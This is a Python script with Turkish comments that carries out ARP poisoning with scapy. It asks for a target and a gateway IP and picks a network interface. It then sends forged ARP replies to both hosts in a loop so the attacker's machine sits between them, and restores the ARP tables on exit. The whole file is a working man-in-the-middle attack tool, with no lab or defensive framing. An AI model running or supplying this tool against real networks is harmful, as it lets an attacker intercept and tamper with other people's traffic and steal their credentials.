#Geliştirme 1
#Ağ arayüzü farklı kullanıcılarda farklı olacağı için scapy ile alınacak bir sistem geliştirildi
#bunun üzerine kullanıcının kendi istediği arayüzü seçebileceği şekilde ekleme yapıldı
#hedep adresler için mac doğrulama yapıldı
#timeout süresi 1e çekildi
#flag ve thread sistemi getirildi
import subprocess
import re
import threading
import time

from scapy.arch import get_if_hwaddr
from scapy.config import conf
from scapy.interfaces import get_if_list
from scapy.layers.l2 import Ether, ARP, getmacbyip,sendp
import warnings

from scapy.sendrecv import send


## Kullanıcıdan hedef IP ve Gateway IP adreslerini al
hedef_ip = input("Hedef IP adresini girin: ")
gateway_ip = input("Gateway IP adresini girin: ")

# İnterface listesi ve seçimi al
interfaces = get_if_list()
print("Mevcut ağ arayüzleri:")
for i, iface in enumerate(interfaces):
    print(f"{i}: {iface}")

# Kullanıcıdan arayüz seçmesini iste
selected = int(input("Kullanmak istediğiniz arayüzün numarasını girin: \n"))
if selected < 0 or selected >= len(interfaces):
    print("Geçersiz arayüz ")
    exit(1)

# Seçilen arayüz ve MAC adresini al
attacker_iface = interfaces[selected]
attacker_mac = get_if_hwaddr(attacker_iface)

print(f"Arayüz = {attacker_iface} , MAC adresi = {attacker_mac}")

# Hedef ve Gateway MAC adreslerini al
hedef_mac = getmacbyip(hedef_ip)
gateway_mac = getmacbyip(gateway_ip)

if hedef_mac is None:
    print(f" {hedef_ip } şeklinde belirtilen hedefin MAC adresi alınamadı")
    exit(1)

if gateway_mac is None:
    print(f" {gateway_ip } şeklinde belirtilen gateway'in MAC adresi alınamadı")
    exit(1)

# Ethernet ve ARP paketlerini oluştur
ethr = Ether(src=attacker_mac)
hedef_arp = ARP(hwsrc=attacker_mac, psrc=gateway_ip, pdst=hedef_ip, hwdst=hedef_mac)
gate_arp = ARP(hwsrc=attacker_mac, psrc=hedef_ip, pdst=gateway_ip, hwdst=gateway_mac)

print("ARP zehirlemesi başlatılıyor... (Durdurmak için Enter'a basın)")

# ARP zehirlemesini durdurmak için bir flag (bayrak) oluşturuyoruz.
stop_flag = False

# ARP zehirleme işlemini başlatan fonksiyon
def arpPsning():
    global stop_flag
    while not stop_flag:
        sendp(ethr / hedef_arp, verbose=False)
        sendp(ethr / gate_arp, verbose=False)
        time.sleep(1)

# ARP zehirlenmesini temizlemek için gerçek MAC adresleriyle düzeltme paketleri gönderme
def restore_ntwrk():
    restore_target = ARP(op=2, psrc=gateway_ip, pdst=hedef_ip, hwsrc=gateway_mac, hwdst=hedef_mac)
    restore_gateway = ARP(op=2, psrc=hedef_ip, pdst=gateway_ip, hwsrc=hedef_mac, hwdst=gateway_mac)
    send(restore_target, count=3, verbose=False)
    send(restore_gateway, count=3, verbose=False)
    print("Ağ normale döndürüldü.")

# ARP zehirleme işlemini bir thread ile başlatıyoruz
arp_thread = threading.Thread(target=arpPsning)
arp_thread.start()

# Kullanıcıdan Enter tuşuna basmasını bekliyoruz
input("ARP zehirlemesini durdurmak için Enter'a basın...")

# Enter'a basıldığında flag'i değiştiriyoruz ve işlemi durduruyoruz
stop_flag = True

# Thread'in bitmesini bekliyoruz
arp_thread.join()

# ARP zehirlemesi sonlandırılıyor ve ağ restore ediliyor
print("\nARP zehirlemesi sonlandırılıyor...")
restore_ntwrk()

# Son olarak kullanıcıya bilgi veriyoruz
input("ARP zehirlemesi tamamlandı. Menüye dönmek için Enter'a basın...")


